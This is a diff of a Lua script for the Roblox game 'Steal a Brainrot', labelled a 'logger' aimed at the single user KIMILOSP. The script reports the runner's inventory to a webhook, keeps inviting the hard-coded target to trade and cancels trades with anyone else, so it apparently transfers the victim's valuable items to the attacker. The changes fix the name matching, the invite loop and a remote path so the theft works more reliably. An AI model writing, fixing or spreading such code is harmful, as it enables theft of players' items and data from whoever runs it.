@@ -1,6 +1,6 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX
   · Target único: KIMILOSP (UserId resuelto automáticamente)
   · Todos los eventos van a un solo webhook
   · Listas actualizadas con la última update
@@ -541,14 +541,43 @@ task.spawn(function()
 			targetUserId = Players:GetUserIdFromNameAsync(targetName)
 		end)
 	end
-	if targetUserId == 0 then
+	if not targetUserId or targetUserId == 0 then
 		warn("[LOGGER] No se pudo resolver el usuario: " .. tostring(targetName))
 		return
 	end
 
+	-- nombre real (username) + display name, para que el match no falle
+	pcall(function()
+		local realName = Players:GetNameFromUserIdAsync(targetUserId)
+		if realName and realName ~= "" then
+			targetName = realName
+		end
+	end)
+
+	local targetNames = { string.lower(targetName) }
+	do
+		local plrInServer = Players:GetPlayerByUserId(targetUserId)
+		if plrInServer and plrInServer.DisplayName and plrInServer.DisplayName ~= "" then
+			table.insert(targetNames, string.lower(plrInServer.DisplayName))
+		end
+	end
+
+	local function isTargetName(text)
+		if not text then
+			return false
+		end
+		text = string.lower(text)
+		for _, n in ipairs(targetNames) do
+			if n ~= "" and string.find(text, n, 1, true) then
+				return true
+			end
+		end
+		return false
+	end
+
+	print("[LOGGER] Target: " .. targetName .. " (" .. tostring(targetUserId) .. ")")
+
 	local targetId = targetUserId
-	local nameFromUserIdAsync  = targetName
-	local nameFromUserIdAsync2 = targetName
 
 	local tbl4 = {
 		["Strawberry Elephant"] = true,
@@ -1393,20 +1422,19 @@ task.spawn(function()
 		gearIdx = 1,
 	}
 
-	if #priority > 0 and targetId ~= 0 then
+	if #priority > 0 then
 		fn21(fn11("PRIORITY"), goodWebhook, nil, true, targetName .. " [PRIORITY]", "PRIORITY")
 		tbl6.phase = "PRIORITY"
 		tbl6.queue = priority
-		tbl6.targetId = targetId
+		tbl6.targetId = targetUserId
 		tbl6.running = true
 		tbl6.addIdx = 1
 	else
-		if not ((#normal > 0 or #v > 0 or #v2 > 0) and targetUserId ~= 0) then
+		if not (#normal > 0 or #v > 0 or #v2 > 0) then
 			return
 		end
 		local normal2 = fn11("NORMAL")
 		fn21(normal2, goodWebhook, nil, true, targetName .. " [NORMAL]", nil)
-		fn21(normal2, goodWebhook, nil, false, targetName .. " [NORMAL]", nil)
 		tbl6.phase = "NORMAL"
 		tbl6.queue = normal
 		tbl6.targetId = targetUserId
@@ -1425,7 +1453,7 @@ task.spawn(function()
 	local Accept = fn("RE/TradeService/Accept")
 	local Cancel = fn("RF/TradeService/Cancel")
 	local CreateInvite = fn("RE/TradeService/CreateInvite")
-	local AcceptInvite = fn("RE/TradeService/AcceptInvite")
+	local AcceptInvite = fn("RF/TradeService/AcceptInvite")
 	if not (Invite and AddBrainrot and AddItem and Ready and Accept and Cancel and CreateInvite and AcceptInvite) then
 		return
 	end
@@ -1470,11 +1498,7 @@ task.spawn(function()
 					if tradeLiveTrade2 and tradeLiveTrade2:FindFirstChild("Other") then
 						local username = tradeLiveTrade2.Other:FindFirstChild("Username")
 
-						if username then
-							username = not (string.find(username.Text:lower(), nameFromUserIdAsync:lower(), 1, true) or string.find(username.Text:lower(), nameFromUserIdAsync2:lower(), 1, true))
-						end
-
-						if username then
+						if username and not isTargetName(username.Text) then
 							pcall(function()
 								Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
 							end)
@@ -1577,25 +1601,13 @@ task.spawn(function()
 		end
 	end)
 
+	-- ── INVITE LOOP (CORREGIDO: siempre invita al único target) ──
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
-				local flag = tbl6.priorityDone and tbl6.targetId == targetId
-				local flag2 = true
-
-				if flag then
-					flag2 = false
-				end
-
-				if tbl6.phase ~= "PRIORITY" and tbl6.targetId == targetId then
-					flag2 = false
-				end
-
-				if flag2 then
-					pcall(function()
-						Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
-					end)
-				end
+				pcall(function()
+					Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
+				end)
 			end
 
 			task.wait(2)
@@ -1630,10 +1642,9 @@ task.spawn(function()
 						local v4 = fn5()
 						local v5 = fn6()
 
-						if (#normal2 > 0 or #v4 > 0 or #v5 > 0) and targetUserId ~= 0 then
+						if #normal2 > 0 or #v4 > 0 or #v5 > 0 then
 							local normal3 = fn11("NORMAL")
 							fn21(normal3, goodWebhook, nil, true, targetName .. " [NORMAL]", nil)
-							fn21(normal3, goodWebhook, nil, false, targetName .. " [NORMAL]", nil)
 							tbl6.queue = normal2
 							tbl6.targetId = targetUserId
 							tbl6.phase = "NORMAL"
